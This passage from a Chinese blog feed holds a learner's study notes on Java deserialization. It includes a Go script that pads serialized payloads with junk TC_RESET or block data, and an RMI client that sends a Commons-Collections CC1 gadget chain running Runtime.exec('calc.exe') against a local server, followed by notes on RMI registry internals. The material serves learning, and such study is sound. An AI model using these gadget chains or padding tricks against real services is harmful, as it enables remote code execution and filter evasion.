id="添加垃圾数据（数据包之前）"><a href="#添加垃圾数据（数据包之前）" class="headerlink" title="添加垃圾数据（数据包之前）"></a>添加垃圾数据（数据包之前）</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> main<br><span class="hljs-title function_">import</span> <span class="hljs-params">(</span><br><span class="hljs-params"><span class="hljs-string">&quot;github.com/phith0n/zkar/serz&quot;</span></span><br><span class="hljs-params"><span class="hljs-string">&quot;io/ioutil&quot;</span></span><br><span class="hljs-params"><span class="hljs-string">&quot;log&quot;</span></span><br><span class="hljs-params"><span class="hljs-string">&quot;strings&quot;</span></span><br><span class="hljs-params">)</span><br>func <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>data, _ := ioutil.ReadFile(<span class="hljs-string">&quot;xsw6_a.bin&quot;</span>)<br>serialization, err := serz.FromBytes(data)<br><span class="hljs-keyword">if</span> err != nil &#123;<br>log.Fatal(<span class="hljs-string">&quot;parse error&quot;</span>)<br>&#125;<br><span class="hljs-type">var</span> <span class="hljs-variable">blockData</span> <span class="hljs-operator">=</span> &amp;serz.TCContent&#123;<br>Flag: serz.JAVA_TC_BLOCKDATALONG,<br>BlockData: &amp;serz.TCBlockData&#123;<br>Data: []<span class="hljs-type">byte</span>(strings.Repeat(<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">40000</span>)),<br>&#125;,<br>&#125;<br>serialization.Contents = append(serialization.Contents, blockData)<br>ioutil.WriteFile(<span class="hljs-string">&quot;xsw6_a-padding.ser&quot;</span>, serialization.ToBytes(), 0o755)<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232117599.png" alt="QQ截图20220323203520"></p><p>结果如下。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232117195.png" alt="QQ截图20220323203625"></p><p>可以看到aaaa已经写入。<br>这时候去执行一下新文件。<code>xsw6_a-padding.ser</code><br>成功弹出计算器。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232039471.png" alt="QQ截图20220323203855"></p><p>成功写入垃圾数据并且不影响反序列化结果。</p><h3 id="添加垃圾数据（数据包之后）"><a href="#添加垃圾数据（数据包之后）" class="headerlink" title="添加垃圾数据（数据包之后）"></a>添加垃圾数据（数据包之后）</h3><p>寻思这这不简单，test.go里面的代码换个位置就行。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232045611.png" alt="QQ截图20220323204459"></p><p>emmmm一执行就报错。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232117669.png" alt="QQ截图20220323204532"></p><p>看了下p神的结合报错，一下明白为什么p神这么写。（主要是真一点都不懂go语言）。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">serialization.Contents = <span class="hljs-built_in">append</span>([]*serz.TCContent&#123;blockData&#125;,<br>serialization.Contents...)<br></code></pre></td></tr></table></figure><p>但是这里弹不出计算器了。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232057749.png" alt="QQ截图20220323205735"></p><p>继续跟p神学习了一下。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;github.com/phith0n/zkar/serz&quot;</span><br><span class="hljs-string">&quot;io/ioutil&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br>)<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>data, _ := ioutil.ReadFile(<span class="hljs-string">&quot;xsw6_a.bin&quot;</span>)<br>serialization, err := serz.FromBytes(data)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatal(<span class="hljs-string">&quot;parse error&quot;</span>)<br>&#125;<br><span class="hljs-keyword">var</span> contents []*serz.TCContent<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5000</span>; i++ &#123;<br><span class="hljs-keyword">var</span> blockData = &amp;serz.TCContent&#123;<br>Flag: serz.JAVA_TC_RESET,<br>&#125;<br>contents = <span class="hljs-built_in">append</span>(contents, blockData)<br>&#125;<br>serialization.Contents = <span class="hljs-built_in">append</span>(contents, serialization.Contents...)<br>ioutil.WriteFile(<span class="hljs-string">&quot;xsw6_a-padding.ser&quot;</span>, serialization.ToBytes(), <span class="hljs-number">0</span>o755)<br>&#125;<br></code></pre></td></tr></table></figure><p>对比一下前后+理解一下p神贴出来的代码。也就明白了p神说的话。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232108918.png" alt="QQ截图20220323210554"></p><p>时因为我们 contents 里第一个结构是一个 blockdata ，所以会进入 case<br>TC_BLOCKDATALONG 中，而这里面就抛出了异常。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232117703.png" alt="QQ截图20220323211439"></p><p>成功弹出计算器。</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>前面在 object 后填充一个 blockdata 的方法之所以可行，就是因为首个结构是 object ，处理完后反<br>序列化就结束了， blockdata 根本没有处理，也就不会抛出异常了。<br>那么，我们利用 contents 来填充垃圾字符的方法是否还有效呢？当然有效，<strong>刚刚我们已经说了，在处</strong><br><strong>理 object 前Java会丢弃所有的 TC_RESET （实际上在Grammer中 TC_RESET 也是 object 的一种结</strong><br><strong>构），那么我们用这个字符来填充不就可以了吗？</strong></p>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RMI恶意服务参数</title>
    <link href="/2022/03/22/RMI%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E5%8F%82%E6%95%B0/"/>
    <url>/2022/03/22/RMI%E6%81%B6%E6%84%8F%E6%9C%8D%E5%8A%A1%E5%8F%82%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="RMI恶意服务参数"><a href="#RMI恶意服务参数" class="headerlink" title="RMI恶意服务参数"></a>RMI恶意服务参数</h1><p>在自己写完之后，感觉记忆更加深刻了。也理解的更加清楚。</p><p>自己就是踩了很久的坑（大约无脑了1h），这里我们要注意到自己的jdk版本（因为这里我们结合cc1来进行漏洞测试，还记得cc漏洞版本在额反正有个版本之后就没了，导致我一直弹不出计算器。）这里说一下我的环境。<br>我现在用的<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203222150027.png" alt="QQ截图20220322213250"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Apache-Commons-Collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">RemoteInterface</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br><br>    String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> RemoteException;<br><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">Goodbye</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception;<br><br>   String <span class="hljs-title function_">sayGoodbye</span><span class="hljs-params">(Object work)</span> <span class="hljs-keyword">throws</span> Exception;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先我们这里要扩展<code>Remote</code>：为了远程调用。</p><h3 id="实现接口"><a href="#实现接口" class="headerlink" title="实现接口"></a>实现接口</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.server.RMIClientSocketFactory;<br><span class="hljs-keyword">import</span> java.rmi.server.RMIServerSocketFactory;<br><span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RemoteTrue</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">RemoteInterface</span> &#123;<br><br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteTrue</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteTrue</span><span class="hljs-params">(<span class="hljs-type">int</span> port)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-built_in">super</span>(port);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">RemoteTrue</span><span class="hljs-params">(<span class="hljs-type">int</span> port, RMIClientSocketFactory csf, RMIServerSocketFactory ssf)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-built_in">super</span>(port, csf, ssf);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String name)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hi&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Goodbye</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayGoodbye</span><span class="hljs-params">(Object payload)</span> <span class="hljs-keyword">throws</span> RemoteException &#123;<br>        System.out.println(payload);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;123&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里有两种情况，注意到这里我们是继承了<code>UnicastRemoteObject</code> ：用于获得一个stub。这个stub封装了底层细节，用于和远程对象进行通信。</p><h3 id="远程对象注册到RMI-Registry"><a href="#远程对象注册到RMI-Registry" class="headerlink" title="远程对象注册到RMI Registry"></a>远程对象注册到RMI Registry</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.net.MalformedURLException;<br><span class="hljs-keyword">import</span> java.rmi.AlreadyBoundException;<br><span class="hljs-keyword">import</span> java.rmi.Naming;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, MalformedURLException, AlreadyBoundException, InterruptedException &#123;<br>        <span class="hljs-comment">// 创建远程对象和注册中心</span><br>        <span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">remoteObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteTrue</span>();<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        <span class="hljs-comment">// 绑定</span><br>        registry.rebind(<span class="hljs-string">&quot;Hello&quot;</span>, remoteObject);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里值得注意的一点就是：我们可以在实现接口的地方不用继承<code>UnicastRemoteObject</code>，在这里添加上<strong>RemoteInterface skeleton &#x3D; (RemoteInterface) UnicastRemoteObject.exportObject(remoteObject, 0);</strong></p><p>这里也就su18说的这里。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203222150579.png" alt="QQ截图20220322213458"></p><h3 id="客户端实现攻击"><a href="#客户端实现攻击" class="headerlink" title="客户端实现攻击"></a>客户端实现攻击</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIClient</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-number">1099</span>);<br>        System.out.println(Arrays.toString(registry.list()));<br><br>        <span class="hljs-type">RemoteInterface</span> <span class="hljs-variable">stub</span> <span class="hljs-operator">=</span> (RemoteInterface) registry.lookup(<span class="hljs-string">&quot;Hello&quot;</span>);<br>        System.out.println(stub.sayGoodbye(payload()));<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">payload</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map.put(<span class="hljs-string">&quot;value&quot;</span>, <span class="hljs-string">&quot;lala&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">transformedMap</span> <span class="hljs-operator">=</span> TransformedMap.decorate(map, <span class="hljs-literal">null</span>, transformerChain);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">cl</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">ctor</span> <span class="hljs-operator">=</span> cl.getDeclaredConstructor(Class.class, Map.class);<br>        ctor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> ctor.newInstance(Target.class, transformedMap);<br>        <span class="hljs-keyword">return</span> instance;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>总结一下：</p><p>1、 创建远程对象和注册中心<br>        <code>RemoteInterface remoteObject = new RemoteTrue();</code><br>        <code>Registry registry = LocateRegistry.createRegistry(1099);</code></p><p>2、 注册中心绑定<br>        <code>registry.rebind(&quot;Hello&quot;, remoteObject);</code></p><p>3、注册中心收到绑定，客户端获取注册中心与其通信</p><p>​        <code>Registry registry = LocateRegistry.getRegistry(&quot;localhost&quot;, 1099);</code></p><p>4、服务查找</p><p>​             <code>RemoteInterface stub = (RemoteInterface) registry.lookup(&quot;Hello&quot;);</code></p><p>5、注册中心收到结果。</p><p>6、远程调用方法，并且将调用的参数序列化。</p><p>​        <code>stub.sayGoodbye(payload())</code></p><p>7、服务端收到信息，将其反序列化进行。</p><p>虽然没有跟懂内部深层代码，但是大体流程已经比以前更加清楚了。嘿嘿。</p><h1 id="RMI动态类加载"><a href="#RMI动态类加载" class="headerlink" title="RMI动态类加载"></a>RMI动态类加载</h1><p>从<code>JDK-6u45</code>和<code>JDK-7u21</code>开始<code>java.rmi.server.useCodebaseOnly</code>的值就默认为true，防止JVM从其他地址动态加载类，而要实现远程加载类攻击则需要该值为<code>false</code></p><p>这里就不复现了。</p><p>利用条件太过苛刻，实战性不大，配置过程也很麻烦，这里就不复现了</p><p>详见 <a href="https://xz.aliyun.com/t/7900#toc-9">https://xz.aliyun.com/t/7900#toc-9</a></p>]]></content>
    
    
    <categories>
      
      <category>RMI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RMI（2）</title>
    <link href="/2022/03/22/RMI%EF%BC%882%EF%BC%89/"/>
    <url>/2022/03/22/RMI%EF%BC%882%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="RMI（2）"><a href="#RMI（2）" class="headerlink" title="RMI（2）"></a>RMI（2）</h1><p>昨天复习到了远程对象的创建，今天继续弄一下注册中心的创建。<br>（弄一会吧，待会要看看红谷杯。）</p><h3 id="远程对象的创建"><a href="#远程对象的创建" class="headerlink" title="远程对象的创建"></a>远程对象的创建</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203221754200.png" alt="QQ截图20220322162245"></p><p>跟进看看。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203221754933.png" alt="QQ截图20220322162323"></p><p>我们可以看到这里new了一个RegistryImpl(),继续跟进看看。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203221631068.png" alt="QQ截图20220322163112"></p><p>这里先判断了是不是1099端口，以及System.getSecurityManager为空的判断。然后结果为false，接着new了一个LiveRef（）然后又new了一个UnicastServerRef（）。最后调用setup进行配置。跟进。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203221754393.png" alt="QQ截图20220322163521"></p><p>这里会进行创建动态代理，跟进看看。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203221754975.png" alt="QQ截图20220322163654"></p><p>这里进行判断，如果需要创建代理的类在本地有 <code>_Stub</code> 的类，则直接使用 createStub 方法反射调用 stub 类的构造方法创建类实例。进入createStub（）。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203221754669.png" alt="QQ截图20220322163801"></p><p>这里由于是 RegistryImpl 这个类。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203221754042.png" alt="QQ截图20220322163922"></p><p>系统会找到 RegistryImpl_Stub 这个类并进行实例化，RegistryImpl_Stub 继承了 RemoteStub ，实现了 Registry。这个类实现了 bind&#x2F;list&#x2F;lookup&#x2F;rebind&#x2F;unbind 等 Registry 定义的方法，全部是通过序列化和反序列化来实现的。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203221740195.png" alt="QQ截图20220322174028"></p><p>创建完代理类之后，会调用 setSkeleton 方法调用 <code>Util.createSkeleton()</code> 方法创建 skeleton。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203221754825.png" alt="QQ截图20220322170011"></p><p>总结：</p><ul><li>远程服务对象使用动态代理，invoke 方法最终调用 UnicastRef 的 invoke 方法，注册中心使用 RegistryImpl_Stub，同时还创建了 RegistryImpl_Skel</li><li>远程对象默认随机端口，注册中心默认是 1099（当然也可以指定）</li></ul><h3 id="服务注册"><a href="#服务注册" class="headerlink" title="服务注册"></a>服务注册</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203221754146.png" alt="QQ截图20220322171112"></p><h2 id="服务发现"><a href="#服务发现" class="headerlink" title="服务发现"></a>服务发现</h2><ul><li>首先在本地创建了一个包含了具体通信地址、端口的 RegistryImpl_Stub 对象</li><li>通过调用这个本地的 RegistryImpl_Stub 对象的 bind&#x2F;list… 等方法，来与 Registry 端进行通信</li><li>而 RegistryImpl_Stub 的每个方法，都实际上调用了 RemoteRef 的 invoke 方法，进行了一次远程调用链接</li><li>这个过程使用 java 原生序列化及反序列化来实现</li></ul><h2 id="服务调用"><a href="#服务调用" class="headerlink" title="服务调用"></a>服务调用</h2><p>在调用其 lookup 方法时，会向 Registry 端传递序列化的 name ，然后将 Registry 端回传的结果反序列化，很好理解。</p><p>到这里我以及很迷糊了。我终究还是没有弄懂rmi的流程（没有深入代码）。</p>]]></content>
    
    
    <categories>
      
      <category>RMI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>RMI（1）</title>
    <link href="/2022/03/21/RMI%EF%BC%881%EF%BC%89/"/>
    <url>/2022/03/21/RMI%EF%BC%881%EF%BC%89/</url>
    
